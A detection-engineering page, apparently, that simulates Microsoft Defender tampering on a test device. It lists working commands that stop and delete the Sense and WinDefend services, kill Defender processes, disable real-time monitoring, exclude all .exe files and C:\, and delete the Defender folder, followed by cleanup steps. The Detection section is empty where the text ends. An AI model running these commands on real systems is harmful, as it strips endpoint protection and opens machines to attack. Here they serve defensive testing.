# Defender Tampering Detection

Endpoint protection tampering refers to attempts by attackers to disable or modify security settings on a device to weaken its defenses. This can involve altering antivirus configurations, disabling real-time protection, or modifying registry keys to bypass security controls.

## Simulation

Run the following commands in PowerShell / Windows Command Prompt on a test device.

### EDR Tampering

Microsoft Defender Tampering is a technique where attackers disable or interfere with Microsoft Defender to avoid detection of their malicious tools and activities. This may involve killing Defender processes, modifying registry keys, or blocking updates, which disrupts security scanning and prevents the latest security protections from being applied.

Run the following commands in Windows Command Prompt on a test device to attempt to disable MDE EDR solution.

```powershell
net.exe stop Sense
sc.exe delete Sense
taskkill /F /IM MsSense.exe
```

### AV Tampering

Microsoft Defender AV Tampering is a technique where attackers disable or interfere with Microsoft Defender Antivirus to avoid detection of their malicious tools and activities. This may involve killing Defender processes, modifying registry keys, or blocking updates, which disrupts security scanning and prevents the latest security protections from being applied.

Attempt to disable using PowerShell

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -MAPSReporting 0
Set-MpPreference -ExclusionExtension "exe" -ExclusionPath "C:\"
```

Attempt to disable using Registry Keys

```powershell
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d 0 /f
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Extensions" /v "exe" /t REG_SZ /d 0 /f
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\\" /t REG_SZ /d "" /f
```

Attempt to disable using command

```powershell
sc stop WinDefend
net stop WinDefend
```

Attempt to disable by killing tasks

```powershell
taskkill /IM MsMpEng.exe /F
rmdir /s /q "C:\Program Files\Windows Defender"
```

> *Script:* [download](Invoke-DefenderTamperingSimulation.ps1)

## Cleanup

```powershell
Set-MpPreference -DisableRealtimeMonitoring $false
Set-MpPreference -MAPSReporting 2
Remove-MpPreference -ExclusionExtension "exe" -ExclusionPath "C:\"

reg.exe delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /f
reg.exe delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /f
reg.exe delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Extensions" /v "exe" /f
reg.exe delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\" /f
```

## Detection